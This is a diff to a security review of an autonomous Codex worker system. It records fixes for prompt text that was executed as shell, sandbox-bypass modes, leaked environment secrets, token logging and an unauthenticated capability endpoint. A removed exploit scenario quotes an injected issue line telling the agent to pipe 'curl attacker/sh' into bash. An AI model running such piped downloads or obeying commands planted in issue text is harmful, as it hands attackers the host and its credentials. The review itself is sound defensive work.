@@ -47,7 +47,7 @@ block merging this documentation-only review.
 | ID | Severity | File | Risk | Exploit scenario | Fix recommendation |
 | --- | --- | --- | --- | --- | --- |
 | SEC-01 | Critical | `scripts/drivers/codex-headless.sh:6-43` | The live Codex driver now rejects `ODIN_CODEX_SANDBOX_MODE=danger-full-access`; keep this blocked in every autonomous worker lane. | A regression or parallel runner that reintroduces sandbox bypass support could let a misconfigured service env or compromised operator env cause worker runs to bypass Codex approvals and filesystem sandboxing. | Keep the live driver and canonical Go executor fail-closed on `danger-full-access` and sandbox bypass flags. |
-| SEC-02 | Critical | `scripts/drivers/codex-headless.sh:125-147`, `scripts/drivers/codex-headless.sh:226-263` | Prompt text can request an exact command, which is extracted and executed through `bash -c`. | A GitHub issue body or persisted prompt says "run the following command: curl attacker/sh | bash" and the driver executes it as shell from the repo/worktree. | Delete the exact-command execution path or replace it with a small allowlisted command dispatcher using explicit args. Treat all issue and prompt text as data, never shell. |
+| SEC-02 | Critical | `scripts/drivers/codex-headless.sh` | The live Codex driver now treats prompt text that looks like an exact command as prompt data and does not execute it through shell. | A regression or parallel runner that reintroduces prompt-command extraction could allow a GitHub issue body or persisted prompt to become host shell code. | Keep prompt and issue text as data. If command-like automation is needed later, implement explicit allowlisted operations with structured args instead of prompt parsing. |
 | SEC-03 | High | `internal/executors/codex/adapter.go:241-250`, `internal/executors/drivers/driver.go:43-58` | Codex driver subprocesses inherit the full daemon environment through `os.Environ`. | A worker or driver can read `GITHUB_TOKEN`, `ODIN_ADMIN_TOKEN`, OpenAI/Codex credentials, Google tokens, or other production env values and echo them into logs/artifacts. | Launch workers with an allowlisted environment. Pass only runtime IDs, workspace path, and non-secret config needed for that lane. |
 | SEC-04 | High | `internal/telemetry/logs/logger.go:34-70`, `internal/telemetry/logs/logger_test.go:67-91` | Structured logger writes sensitive field values verbatim; the current characterization test explicitly protects that behavior. | A GitHub, Codex, browser, or deployment error includes a token in `Fields`; Odin persists it into service logs. | Add a redacting logger layer for key names and token-like values, then flip the characterization test to require redaction. |
 | SEC-05 | High | `internal/api/http/capabilities.go:195-216`, `internal/core/policy/service.go:81-83`, `internal/app/lifecycle/run.go:2247-2265` | `POST /capabilities/{id}:invoke` is not authenticated at the HTTP route, and policy permits empty caller identity when a descriptor has no permissions. | If the HTTP service is exposed beyond loopback, an unauthenticated caller can invoke currently narrow capabilities and future mutable/subprocess-backed capabilities unless every descriptor is perfectly permissioned. | Require admin or service-token authentication for all HTTP capability invocation. Reject empty API caller identity and default-deny mutable or subprocess-backed capabilities. |
@@ -96,9 +96,9 @@ token caches, and worker artifacts.
 ## Process Execution Review
 
 The Go git and driver adapters mostly use `exec.CommandContext` with explicit
-arguments. The exception is shell behavior in `scripts/drivers/codex-headless.sh`
-that executes extracted prompt command text with `bash -c`. That is the highest
-process-execution blocker.
+arguments. The live Codex driver no longer executes prompt-extracted command
+text with `bash -c`; keep any future command-like automation behind explicit
+allowlisted operations with structured args.
 
 ## Filesystem Safety Review
 
@@ -125,9 +125,8 @@ use `pull_request_target` for code execution without a separate security review.
 The safe compatibility runner under `internal/runner/codexexec` rejects
 `danger-full-access`, and the daemon's live driver script now rejects
 `ODIN_CODEX_SANDBOX_MODE=danger-full-access` before invoking Codex. Prompt text
-still remains capable of triggering shell command execution. Do not run
-unattended real Codex implementation workers until that behavior is removed or
-blocked in the canonical executor path.
+that looks like a command is now passed as prompt data instead of being executed
+as shell by the live driver.
 
 ## Autonomous Merge Or Deploy Review
 
@@ -145,7 +144,7 @@ dry-run behavior is tested.
 - Why needed: Blocks unsafe unattended worker execution.
 
 - Title: Delete shell execution of prompt-extracted commands
-- Goal: Remove or replace the `bash -c` exact-command path in `scripts/drivers/codex-headless.sh`.
+- Goal: Keep prompt text from being extracted and executed as shell by `scripts/drivers/codex-headless.sh`.
 - Suggested agent: security
 - Labels: odin:ready, agent:security, type:safety
 - Why needed: Prevents GitHub issue or prompt text from becoming shell code.
